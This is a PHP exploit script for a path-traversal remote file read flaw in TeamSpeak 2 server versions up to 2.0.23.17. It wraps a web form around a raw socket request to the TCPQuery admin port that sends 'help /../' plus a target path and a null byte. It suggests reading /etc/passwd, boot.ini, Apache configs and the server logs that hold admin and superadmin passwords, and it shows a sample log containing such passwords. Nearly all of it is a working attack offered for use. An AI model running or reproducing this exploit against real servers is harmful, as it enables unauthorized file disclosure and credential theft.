<?php
// teamspeak server <= 2.0.23.17 remote read file vulnerability
// bug found and exploit write by c411k
// http://www.heise-online.co.uk/security/Vulnerability-in-TeamSpeak-2-server--/news/93734 zazhali ploent svolo4i!!
// tested on win ts2_server_rc2_202317, ts2_server_rc2_20201.exe
// grats all https://forum.antichat.ru
// use http://localhost/ts_xek.php
// 10.01.09

error_reporting(0);
@ini_set("max_execution_time",0);
@ini_set('output_buffering',0);
@set_magic_quotes_runtime(0);
@set_time_limit(0);
@ob_implicit_flush(1);

header("Content-Type: text/html; charset=utf-8\r\n");
header("Pragma: no-cache");

function check_ver($site, $xek, $port)
{
	$url = fsockopen("$site", "$port", $errno, $errstr, 22);
	$send_pac = "$xek\r\n\r\n";
	fputs($url, $send_pac);
	$s = '';
	
	while (!feof($url) and strpos(implode($s), 'OK') === false)
	{
		$s[] = fgets($url, 1028);
	}
	fclose($url);
	return implode($s);
}

function html()
{
	if (isset($_POST['file']))
		$file = $_POST['file'];
	else $file = '../../../../../etc/passwd';
	echo 
	'<pre><form action="'.$_SERVER['PHP_SELF'].'?go_fuck" method="post">
	<input style="background-color: #31333B; color: #B9B9BD; border-color: #646C71;" name="parampampam" type="submit" value="&#8194;read file...&#8194;">
	<input style="background-color: #31333B; color: #B9B9BD; border-color: #646C71;" name="check_ver" type="submit" value="&#8194;check_version&#8194;"><br>
	<input style="background-color: #31333B; color: #B9B9BD;" name="hostname" value="localhost"><font color="#B9B9BD">&#8194;&#172; teamspeak hostname or ip, for expamle "ts.antichat.ru"
	<input style="background-color: #31333B; color: #B9B9BD;" name="port" value="51234"><font color="#B9B9BD">&#8194;&#172; port to TCQquery admin, default 51234
	<input style="background-color: #31333B; color: #B9B9BD;" name="file" value="'.$file.'"><font color="#B9B9BD">&#8194;&#172; file to read.';
}

function info()
{
	echo
	'<br>
	for example: 
	server.log
	server.dbs
	../../../../../boot.ini
	../../../../../etc/passwd
	../../../../../usr/local/apache/conf/httpd.conf etc.
	brain on ;)
	
	admin and superadmin passwords you can see in server.log or server.dbs. but in windows i can\'t read this files.
	
	<textarea style="background-color: #31333B; color: #B9B9BD;" name="zz" cols=90 rows=16>---------------------------------------------------------------
-------------- log started at 10-01-09 00:24 -------------
---------------------------------------------------------------
10-01-09 00:24:28,ALL,Info,server,	Server init initialized
10-01-09 00:24:28,ALL,Info,server,	Server version: 2.0.20.1 Win32
10-01-09 00:24:28,WARNING,Info,SQL,	created table ts2_servers
10-01-09 00:24:28,WARNING,Info,SQL,	created table ts2_server_privileges
10-01-09 00:24:28,WARNING,Info,SQL,	created table ts2_channels
10-01-09 00:24:28,WARNING,Info,SQL,	created table ts2_channel_privileges
10-01-09 00:24:28,WARNING,Info,SQL,	created table ts2_clients
10-01-09 00:24:28,WARNING,Info,SQL,	created table ts2_bans
10-01-09 00:24:28,ALL,Info,server,	Starting VirtualServer id:1 with port:8767
10-01-09 00:24:28,WARNING,Info,SERVER,	Default VirtualServer created
10-01-09 00:24:28,WARNING,Info,SERVER,	admin account info: username: admin password: kcqy8y
10-01-09 00:24:28,WARNING,Info,SERVER,	superadmin account info: username: superadmin password: e7em45
10-01-09 00:24:29,ALL,Info,server,	Server init finished</textarea></form>';
}

function head()
{
	echo '<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>xek_teamspeak2</title>
<style>
<!--
A:link {COLOR: #B9B9BD; TEXT-DECORATION: none}
A:visited {COLOR: #B9B9BD; TEXT-DECORATION: none}
A:active {COLOR: #228B22; TEXT-DECORATION: none}
A:hover {COLOR: #E7E7EB; TEXT-DECORATION: underline}
BODY
{
	margin="5";
	FONT-WEIGHT: normal; 
	COLOR: #B9B9BD; 
	BACKGROUND: #44474F; 
	FONT-FAMILY: Courier new, Courier, Verdana, Arial, Helvetica, sans-serif; 
}

-->
</style>
</head>
<body>';
}

head();

if (!$_GET)
{
	html();
	info();
}

if (isset($_GET['go_fuck']))
{
	$hostname = $_POST['hostname'];
	$file = $_POST['file'];
	$port = $_POST['port'];
	
	if (isset($_POST['check_ver']))
	{
		echo '<pre>'.check_ver($hostname, 'ver', $port);
		
	}
	
	if (isset($_POST['parampampam']))
	{
		echo '<textarea style="background-color: #31333B; color: #B9B9BD;" name="zz" cols=90 rows=16>'.check_ver($hostname, 'help /../'.$file."\0", $port).'</textarea>';
		html();
		
	}
}

?>


